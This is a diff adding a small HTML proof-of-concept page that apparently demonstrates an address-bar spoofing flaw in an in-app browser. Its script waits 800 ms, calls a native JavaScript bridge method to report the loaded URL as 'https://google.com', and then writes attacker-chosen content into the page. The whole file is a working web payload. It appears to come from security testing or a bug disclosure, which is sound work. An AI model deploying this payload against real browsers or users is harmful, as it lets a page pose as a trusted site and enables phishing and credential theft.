@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+  <body>
+<script>
+  setTimeout(function () {
+    let w = window.iabSDKJSBridge.onLoadUrlChanged(
+      "https://google.com"
+    );
+    document.write("<h1>Address bar spoof</h1>");
+  }, 800);
+</script>
+</body></html>
